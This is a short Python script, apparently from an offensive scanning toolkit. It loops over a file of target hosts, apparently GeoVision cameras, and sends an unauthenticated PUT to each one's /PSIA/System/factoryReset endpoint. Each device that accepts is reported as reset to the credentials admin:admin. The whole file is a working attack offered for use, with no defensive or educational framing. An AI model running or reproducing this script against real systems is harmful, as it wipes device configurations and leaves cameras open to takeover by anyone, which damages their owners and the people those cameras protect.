import sys, os, requests, requests.exceptions
from host import host
class geovisionExploit:
    def geovisionExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                url = "http://" + address['ip'] + ":" + str(address['port']) + "/PSIA/System/factoryReset"
                c = requests.put(url)
                if c.ok == True:
                    print("[-] Found http://"+ address['ip'] + ":" + str(address['port']) + " and credential reset to admin:admin")
            except:
                pass
            a += 1
